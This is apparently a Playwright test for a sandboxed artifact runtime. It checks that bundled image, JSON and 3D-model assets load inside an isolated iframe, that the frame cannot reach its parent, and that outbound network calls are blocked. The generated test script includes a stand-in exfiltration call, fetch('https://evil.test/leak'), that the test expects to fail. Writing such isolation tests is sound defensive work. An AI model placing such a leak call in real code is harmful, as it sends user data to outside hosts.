import { execFile } from 'node:child_process'
import { mkdir, mkdtemp, readFile, rm, symlink, writeFile } from 'node:fs/promises'
import { tmpdir } from 'node:os'
import { join } from 'node:path'
import { fileURLToPath } from 'node:url'
import { expect, test } from '@playwright/test'
import { buildProConsoleBridgeScript, STUDIO_PRO_ARTIFACT_LIMITS } from '@sistemazero/core/studio'
import { serveArtifact, storeArtifact } from '../../studio-runtime/src/artifacts'
import { trustedPackageJson, trustedViteConfig } from '../../studio-runtime/src/contracts'
import { memoryArtifactBucket } from '../../studio-runtime/tests/artifact-bucket'

const runtime = fileURLToPath(new URL('../../studio-runtime/runtime/', import.meta.url))
const run = (args: string[], cwd: string) =>
  new Promise<void>((resolve, reject) => {
    execFile('node', args, { cwd, timeout: 30_000 }, (error, stdout, stderr) => {
      if (error) reject(new Error(`${error.message}\n${stdout}\n${stderr}`))
      else resolve()
    })
  })

test('compiled modules, PNG, SVG, JSON, glTF and GLB work in the isolated artifact; external network stays blocked', async ({
  page,
}, testInfo) => {
  const root = await mkdtemp(join(tmpdir(), 'studio-artifact-browser-'))
  const { bucket } = memoryArtifactBucket()
  const blocked: string[] = []
  const diagnostics: string[] = []
  page.on('console', (message) => diagnostics.push(`${message.type()}: ${message.text()}`))
  page.on('pageerror', (error) => diagnostics.push(error.message))
  page.on('requestfailed', (request) =>
    diagnostics.push(`${request.url()}: ${request.failure()?.errorText}`),
  )
  try {
    await mkdir(join(root, 'src'))
    await mkdir(join(root, 'public', 'models'), { recursive: true })
    await symlink(join(runtime, 'node_modules'), join(root, 'node_modules'), 'junction')
    await writeFile(join(root, 'package.json'), trustedPackageJson('three-ts'))
    await writeFile(join(root, 'vite.config.mjs'), trustedViteConfig('three-ts'))
    await writeFile(
      join(root, 'index.html'),
      '<html><head></head><body><script type="module" src="/src/main.ts"></script></body></html>',
    )
    await writeFile(
      join(root, 'src', 'main.ts'),
      `
      import { TextureLoader } from 'three';
      import { GLTFLoader } from 'three/addons/loaders/GLTFLoader.js';
      import './style.css';
      const [texture, model, metadata, vector, binaryModel] = await Promise.all([
        new TextureLoader().loadAsync('./pixel'),
        new GLTFLoader().loadAsync('./models/model.gltf'),
        fetch('./metadata.json').then(r => r.json()),
        new TextureLoader().loadAsync('./vector'),
        new GLTFLoader().loadAsync('./model.glb'),
      ]);
      console.log('assets-ready', texture.image.width, model.scene.name, metadata.score);
      document.body.dataset.assets = String(texture.image.width) + ':' + model.scene.name + ':' + metadata.score + ':' + vector.image.width + ':' + binaryModel.scene.name;
      try { await fetch('https://evil.test/leak'); } catch { document.body.dataset.blocked = 'yes'; }
      texture.dispose(); vector.dispose();
    `,
    )
    await writeFile(join(root, 'src', 'style.css'), 'body { background-image: url("/pixel"); }')
    await writeFile(
      join(root, 'public', 'pixel'),
      Buffer.from(
        'iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mP8/x8AAwMCAO+a9WQAAAAASUVORK5CYII=',
        'base64',
      ),
    )
    // A real glTF with an external buffer exercises nested relative asset resolution.
    await writeFile(
      join(root, 'public', 'models', 'model.gltf'),
      JSON.stringify({
        asset: { version: '2.0' },
        scene: 0,
        scenes: [{ name: 'Molda', nodes: [0] }],
        nodes: [{ mesh: 0 }],
        meshes: [{ primitives: [{ attributes: { POSITION: 0 } }] }],
        buffers: [{ uri: 'mesh.bin', byteLength: 36 }],
        bufferViews: [{ buffer: 0, byteLength: 36 }],
        accessors: [
          {
            bufferView: 0,
            componentType: 5126,
            count: 3,
            type: 'VEC3',
            min: [0, 0, 0],
            max: [1, 1, 0],
          },
        ],
      }),
    )
    await writeFile(
      join(root, 'public', 'models', 'mesh.bin'),
      Buffer.from(new Float32Array([0, 0, 0, 1, 0, 0, 0, 1, 0]).buffer),
    )
    await writeFile(join(root, 'public', 'metadata.json'), '{"score":7}')
    await writeFile(
      join(root, 'public', 'vector'),
      '<svg xmlns="http://www.w3.org/2000/svg" width="2" height="2"><rect width="2" height="2" fill="red"/></svg>',
    )
    const glbJson = JSON.stringify({
      asset: { version: '2.0' },
      scene: 0,
      scenes: [{ name: 'GLB' }],
    })
    const padded = Buffer.from(glbJson.padEnd(Math.ceil(Buffer.byteLength(glbJson) / 4) * 4, ' '))
    const glb = Buffer.alloc(20 + padded.length)
    glb.writeUInt32LE(0x46546c67, 0)
    glb.writeUInt32LE(2, 4)
    glb.writeUInt32LE(glb.length, 8)
    glb.writeUInt32LE(padded.length, 12)
    glb.writeUInt32LE(0x4e4f534a, 16)
    padded.copy(glb, 20)
    await writeFile(join(root, 'public', 'model.glb'), glb)
    await page.goto('/')
    const parentOrigin = new URL(page.url()).origin
    await writeFile(
      join(root, 'artifact-options.json'),
      JSON.stringify({ consoleBridge: buildProConsoleBridgeScript(parentOrigin) }),
    )
    await run(
      [
        join(runtime, 'node_modules/vite/bin/vite.js'),
        'build',
        '--config',
        './vite.config.mjs',
        '--configLoader',
        'native',
      ],
      root,
    )
    await run(
      [
        join(runtime, 'pack-artifact.mjs'),
        String(STUDIO_PRO_ARTIFACT_LIMITS.maxBytes),
        String(STUDIO_PRO_ARTIFACT_LIMITS.maxFiles),
      ],
      root,
    )
    const artifact = await storeArtifact({
      bucket,
      origin: 'https://runtime.test',
      parentOrigin,
      manifest: JSON.parse(await readFile(join(root, 'artifact-manifest.json'), 'utf8')),
      read: async (path) => new Uint8Array(await readFile(join(root, 'dist', path))),
    })
    await page.route('https://runtime.test/**', async (route) => {
      const response = await serveArtifact(new Request(route.request().url()), bucket)
      await route.fulfill({
        status: response.status,
        headers: Object.fromEntries(response.headers),
        body: Buffer.from(await response.arrayBuffer()),
      })
    })
    await page.route('https://evil.test/**', async (route) => {
      blocked.push(route.request().url())
      await route.abort()
    })
    await page.evaluate((url) => {
      const frame = document.createElement('iframe')
      frame.dataset.testid = 'artifact'
      frame.setAttribute('sandbox', 'allow-scripts allow-pointer-lock')
      frame.src = url
      document.body.append(frame)
    }, artifact.url)
    const body = page.frameLocator('[data-testid="artifact"]').locator('body')
    await expect(body).toHaveAttribute('data-assets', '1:Molda:7:2:GLB')
    await expect(body).toHaveAttribute('data-blocked', 'yes')
    expect(blocked).toEqual([])
    const frame = page.frames().find((candidate) => candidate.url() === artifact.url)!
    expect(
      await frame.evaluate(() => {
        try {
          return window.parent.document.title
        } catch {
          return 'isolated'
        }
      }),
    ).toBe('isolated')
  } finally {
    await testInfo.attach('browser-diagnostics', {
      body: diagnostics.join('\n'),
      contentType: 'text/plain',
    })
    await rm(root, { recursive: true, force: true })
  }
})
